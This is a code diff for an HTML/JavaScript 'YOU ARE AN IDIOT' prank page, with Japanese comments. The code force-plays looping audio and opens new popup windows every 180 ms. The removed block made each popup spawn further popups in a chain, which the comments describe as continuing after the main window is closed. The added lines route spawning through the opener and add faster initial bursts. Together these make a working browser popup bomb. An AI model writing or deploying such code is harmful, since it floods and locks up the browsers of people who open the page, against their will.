@@ -32,7 +32,7 @@
     <h1>YOU ARE AN IDIOT</h1>
     <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" 
          class="idiot-img" alt="You are an idiot">
-    <p>メインウィンドウを閉じても勝手に増え続けるよ...<br>180msごとに爆増</p>
+    <p>180msごとに爆速で勝手に増えるよ...<br>押したら地獄</p>
 
     <audio id="idiotSound" preload="auto" loop></audio>
 
@@ -90,58 +90,11 @@
                                 setTimeout(forcePlay, 20);
                                 setTimeout(forcePlay, 50);
 
-                                // ★★★ メインウィンドウを閉じても止まらないように ★★★
-                                // 各ポップアップが独立して180msごとに新しいポップアップを生成
+                                // ポップアップ自身も180msごとに勝手に増やす
                                 setInterval(() => {
-                                    // 新しいポップアップを直接生成
-                                    const w = 480;
-                                    const h = 440;
-                                    const l = Math.random() * (screen.availWidth - w - 100) + 50;
-                                    const t = Math.random() * (screen.availHeight - h - 100) + 50;
-
-                                    window.open('', '_blank', 
-                                        `width=${w},height=${h},left=${Math.floor(l)},top=${Math.floor(t)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no`
-                                    ).document.write(\`
-                                        <!DOCTYPE html>
-                                        <html>
-                                        <head>
-                                            <meta charset="UTF-8">
-                                            <title>YOU ARE AN IDIOT ×\${count}</title>
-                                            <style>
-                                                body { margin:0; padding:0; background:black; color:lime; text-align:center; overflow:hidden; }
-                                                h1 { font-size:3em; margin:8vh 0 10px; text-shadow:0 0 20px lime; animation: blink 0.3s infinite alternate; }
-                                                .idiot-img { max-width:95vw; max-height:72vh; width:auto; height:auto; margin:10px auto; display:block; border:8px solid lime; box-shadow:0 0 40px lime; }
-                                                @keyframes blink { from { opacity: 0.4; } to { opacity: 1; } }
-                                            </style>
-                                        </head>
-                                        <body>
-                                            <h1>YOU ARE AN IDIOT</h1>
-                                            <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" class="idiot-img" alt="idiot">
-                                            <p>勝手に増えてる...</p>
-                                            <audio id="sound" preload="auto" loop></audio>
-                                            <script>
-                                                const s = document.getElementById('sound');
-                                                s.src = "https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3";
-                                                function forcePlay() {
-                                                    s.currentTime = 0;
-                                                    s.play().catch(() => setTimeout(forcePlay, 30));
-                                                }
-                                                window.onload = function() {
-                                                    forcePlay();
-                                                    setTimeout(forcePlay, 20);
-                                                    setTimeout(forcePlay, 50);
-                                                    setInterval(() => {
-                                                        // 自分もさらに増やす（連鎖）
-                                                        const nw = 480; const nh = 440;
-                                                        const nl = Math.random() * (screen.availWidth - nw - 100) + 50;
-                                                        const nt = Math.random() * (screen.availHeight - nh - 100) + 50;
-                                                        window.open('', '_blank', \`width=\${nw},height=\${nh},left=\${Math.floor(nl)},top=\${Math.floor(nt)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no\`);
-                                                    }, 180);
-                                                };
-                                            <\/script>
-                                        </body>
-                                        </html>
-                                    \`);
+                                    if (window.opener && typeof window.opener.spawnPopup === 'function') {
+                                        window.opener.spawnPopup();
+                                    }
                                 }, 180);
                             };
                         <\/script>
@@ -153,29 +106,35 @@
             }
         }
 
-        // メイン画面の処理
+        // ====================== メイン画面 ======================
         window.onload = () => {
             function mainForcePlay() {
                 sound.currentTime = 0;
                 sound.play().catch(() => setTimeout(mainForcePlay, 30));
             }
 
+            // 音を全力自動再生
             mainForcePlay();
             setTimeout(mainForcePlay, 10);
             setTimeout(mainForcePlay, 30);
+            setTimeout(mainForcePlay, 70);
 
-            // 初期連発
+            // 開いた瞬間に超高速連発
             setTimeout(() => spawnPopup(), 100);
-            setTimeout(() => spawnPopup(), 180);
-            setTimeout(() => spawnPopup(), 260);
-            setTimeout(() => spawnPopup(), 340);
+            setTimeout(() => spawnPopup(), 150);
+            setTimeout(() => spawnPopup(), 200);
+            setTimeout(() => spawnPopup(), 250);
+            setTimeout(() => spawnPopup(), 300);
+            setTimeout(() => spawnPopup(), 350);
 
-            // メインも180msで増やす（保険）
+            // ★★★ 自動増殖を180msごとに ★★★
             setTimeout(() => {
-                setInterval(spawnPopup, 180);
-            }, 500);
+                setInterval(() => {
+                    spawnPopup();
+                }, 180);
+            }, 400);
 
-            // 音の保険
+            // 最終保険
             setInterval(() => {
                 if (sound.paused) mainForcePlay();
             }, 30);
